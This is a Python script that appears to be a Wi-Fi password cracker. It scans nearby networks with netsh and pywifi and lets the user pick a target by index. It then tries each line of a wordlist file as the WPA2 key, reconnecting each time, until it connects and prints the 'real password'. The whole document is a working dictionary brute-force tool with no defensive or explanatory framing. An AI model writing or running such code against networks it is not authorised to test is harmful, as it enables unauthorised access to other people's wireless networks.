import pywifi
from pywifi import PyWiFi,const,Profile
import time
import subprocess
import re


# TP-Link_2BE4
try :
        # Using the check_output() to retrieve network information
    devices = subprocess.check_output(['netsh', 'wlan', 'show', 'network'])

    # Decode the output to a string
    devices = devices.decode('ascii')
    devices = devices.replace("\r", "")
    SSID=[]
    # Extract the SSID name using regular expressions
    ssids = re.findall(r'SSID \d+ : (.+)', devices)
    for i ,ssid in enumerate(ssids,start=0):
        SID=f"{ssid}"
        NID=f"{i} : {ssid}"
        SSID.append(SID)
        print(NID)
    
    Nnp=int(input('please chose a network and type its index: '))
    NetworkName=SSID[Nnp]

    wifi=PyWiFi()
    INF=wifi.interfaces()[0]
    INF.scan()
    rsult=INF.scan_results()
    
except :
    print('no result')

def getNameAndPass(SSID,PASSW):
    pro=Profile()
    pro.ssid=SSID
    pro.auth=const.AUTH_ALG_OPEN
    pro.akm.append(const.AKM_TYPE_WPA2PSK)
    pro.cipher=const.CIPHER_TYPE_CCMP
    pro.key=PASSW
    INF.remove_all_network_profiles()
    TEMP_PROF=INF.add_network_profile(pro)
    time.sleep(0.1)
    INF.connect(TEMP_PROF)
    time.sleep(0.6)
   
    if INF.status() == 4 :
        time.sleep(0.3)
        print('the real password of this network is ',PASSW)
        exit()
    else:
        print('tried ', PASSW)
def excuteIT():
    for i in open('wifi_pass.txt',"+r").readlines():
        i=i.strip("\n")
        getNameAndPass(NetworkName,i)
excuteIT()
